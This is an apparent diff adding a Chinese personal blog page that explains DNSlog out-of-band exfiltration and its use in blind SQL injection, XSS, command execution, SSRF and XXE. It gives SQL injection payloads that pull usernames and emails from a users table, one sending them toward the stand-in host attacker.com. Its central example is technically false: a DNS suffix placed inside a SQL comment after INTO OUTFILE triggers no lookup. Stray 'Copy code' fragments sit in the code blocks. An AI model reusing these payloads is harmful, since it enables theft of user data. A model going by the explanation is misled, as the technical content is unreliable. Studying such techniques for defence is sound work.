@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>dnslog外带 | zJ4sun</title>
+<meta name="description" content="行胜于言">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://zj4sun.github.io//favicon.ico?v=1735599266098">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://zj4sun.github.io//styles/main.css">
+
+
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://zj4sun.github.io/">zJ4sun</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>dnslog外带</h1>
+            <p class="article-meta">
+              2024-05-08
+              
+                <a href="https://zj4sun.github.io/tag/ZtS9EorEb/" class="badge success">
+                  web安全之路
+                </a>
+              
+            </p>
+            
+            <div class="post-content" v-pre>
+              <h2 id="前言">前言</h2>
+<p>在看hw面经的时候发现了dnslog外带的相关的知识点，有点迷惑，所以写下这篇文章记录，方便日后查阅。</p>
+<h2 id="正文">正文</h2>
+<h3 id="dnslog是什么">DNSlog是什么？</h3>
+<p>要回答这个我们需要先清楚，DNS：(Domain Name System)域名系统，负责把域名转换成IP地址。那么dnslog就是</p>
+<p>DNS的日志，就是存储在DNS Server上的域名访问信息，它记录着用户对域名littlehann.com等的访问信息，类似日志文件。</p>
+<h3 id="dnslog外带原理">DNSlog外带原理</h3>
+<p>DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。也就是在一些网站通过dns请求后，通过读取日志来获取我们的请求信息。可能有点难以理解</p>
+<p>我们换一种说法dnslog外带是指利用 DNS 查询来实现数据传输或者执行远程命令的技术。这种技术的基本原理是将数据嵌入到 DNS 查询中，然后将其发送到一个能够捕获 DNS 查询的服务器上，最后解析查询以获取嵌入的数据。</p>
+<p>DNSlog 外带通常用于绕过网络安全防御，因为 DNS 查询通常允许通过防火墙，且大多数网络都允许 DNS 查询的出站流量。这使得攻击者可以利用 DNS 查询来传输数据或执行恶意操作，而不容易被检测到。</p>
+<h2 id="dnslog注入">DNSlog注入</h2>
+<p>既然能够嵌入一些数据那么，就能想到注入，dns注入常被用在<strong>dnslog通常用在：</strong></p>
+<pre><code class="language-dnslog通常用在：">1.SQL盲注
+2.无回显的XSS
+3.无回显的命令执行
+5.无回显的SSRF
+5.Blind XXE
+</code></pre>
+<h3 id="mysql-dnslog外带注入">mysql-DNSlog外带注入</h3>
+<p>当我们对一个<a href="https://cloud.tencent.com/solution/database?from_column=20065&amp;from=20065">数据库</a>进行注入时，无回显，且无法进行时间注入，那么就可以利用一个通道，把查询到数据通过通道带出去，这里的通道包括：http请求、DNS解析、SMB服务等将数据带出。</p>
+<p>首先首先说明，dns带外查询属于MySQL注入，在MySQL中有个系统属性<br>
+secure_file_priv特性，有三种状态<br>
+secure_file_priv为null 表示不允许导入导出<br>
+secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹<br>
+secure_file_priv没有设置时，则表示没有任何限制<br>
+可了解一下load_file和outfile</p>
+<p>show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
+<p>有路径或为null 的 则不可以进行 DNSlog 外带</p>
+<p>利用 DNS 查询来执行数据传输的技术，通常用于在利用 MySQL 数据库中的注入漏洞时，将数据从受感染的数据库中提取出来，并将其发送到攻击者控制的 DNS 服务器上。</p>
+<p>假设有一个在线商店的网站，该网站使用 MySQL 数据库存储用户的订单信息。该网站的搜索功能存在 SQL 注入漏洞，攻击者可以在搜索框中注入恶意的 SQL 代码，并执行恶意的查询。攻击者想要窃取所有订单的用户名和电子邮件地址。</p>
+<p>攻击者可以构造以下恶意的 SQL 查询来实现这一目的：</p>
+<pre><code>sql
+Copy code
+SELECT username, email FROM orders UNION SELECT NULL, concat(username, '||', email) FROM users--
+</code></pre>
+<p>这个查询将从订单表中选择用户名和电子邮件地址，并与来自用户表的空结果集进行联合。在联合的结果中，攻击者使用 <code>concat()</code> 函数将用户名和电子邮件地址连接成一个字符串，并在它们之间插入特殊分隔符（例如 <code>||</code>）。攻击者通过这种方式将订单信息与用户信息合并到同一个结果集中。</p>
+<p>现在，攻击者需要将这些数据发送到他们控制的 DNS 服务器上。为此，攻击者可以在恶意的 SQL 查询中嵌入 DNS 查询。假设攻击者控制的 DNS 服务器是 <code>attacker.com</code>，那么攻击者可以构造以下 DNS 查询来发送数据：</p>
+<pre><code>sql
+Copy code
+SELECT username, email FROM orders UNION SELECT NULL, concat(username, '||', email) FROM users INTO OUTFILE '/var/www/html/payload.txt'; -- %00.attacker.com
+</code></pre>
+<p>在这个查询中，<code>INTO OUTFILE</code> 子句将查询结果写入到服务器上的一个文件中，例如 <code>payload.txt</code>。然后，攻击者在查询的末尾添加一个恶意的 DNS 后缀（在本例中是 <code>%00.attacker.com</code>），这样查询结果将被发送到 <code>attacker.com</code> 的 DNS 服务器上。</p>
+<p>当数据库服务器执行这个查询时，它会将查询结果写入到 <code>payload.txt</code> 文件中，并尝试解析 DNS 查询 <code>attacker.com</code>。攻击者的 DNS 服务器将收到这个查询，并从查询中提取订单信息，从而完成数据的传输。</p>
+<h2 id="参考">参考</h2>
+<p>本文在书写的时候借鉴了以下师傅的相关的文章</p>
+<p><a href="https://blog.csdn.net/weixin_48083470/article/details/119379081">dnslog外带注入</a></p>
+<p><a href="https://www.cnblogs.com/hellobao/articles/17266933.html">DNSlog外带</a></p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://zj4sun.github.io/post/chang-jian-webshell-gong-ju-mu-ma-te-zheng-fen-xi/">
+                <h3 class="post-title">
+                  常见webshell工具木马特征分析
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://zj4sun.github.io//images/avatar.png?v=1735599266098" class="no-responsive avatar">
+    <div class="text-muted">行胜于言</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-nian-zhong-zong-jie/">2024年年度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/wei-xie-qing-bao/">威胁情报</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-si-ji-du-zong-jie/">2024年第四季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/ruo-kou-ling-zong-jie/">弱口令总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-san-ji-du-zong-jie/">2024年第三季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/python-pa-chong-xue-xi-bi-ji/">python爬虫学习笔记</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/githubgridea-pei-zhi-ge-ren-bo-ke-wu-fa-jia-zai-maincss-wen-ti/">github+gridea配置个人博客无法加载main.css问题</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/2024-nian-di-er-ji-du-zong-jie/">2024年第二季度总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/xuan-ji-ba-chang-apcahe-ri-zhi-fen-xi/">玄机靶场-apcahe日志分析</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://zj4sun.github.io/post/xuan-ji-ba-chang-linux-ri-zhi-fen-xi/">玄机靶场-Linux日志分析</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://zj4sun.github.io/tag/EjyP2cHMk/" class="badge warning">
+          live生活
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/Mt6wUAkn1/" class="badge ">
+          quarter总结
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/zrEiWq5mHs/" class="badge warning">
+          information研究
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/qXZ0OLIUJ/" class="badge success">
+          python脚册
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/EJT8wG8lz/" class="badge success">
+          setting环境设置
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/ApJiA0cW4/" class="badge warning">
+          Emergency响应
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/ZtS9EorEb/" class="badge secondary">
+          web安全之路
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/4KkPHXGCg/" class="badge secondary">
+          job实习项目
+        </a>
+      
+        <a href="https://zj4sun.github.io/tag/1Wpns8h4a/" class="badge ">
+          vulnhub打靶
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://zj4sun.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
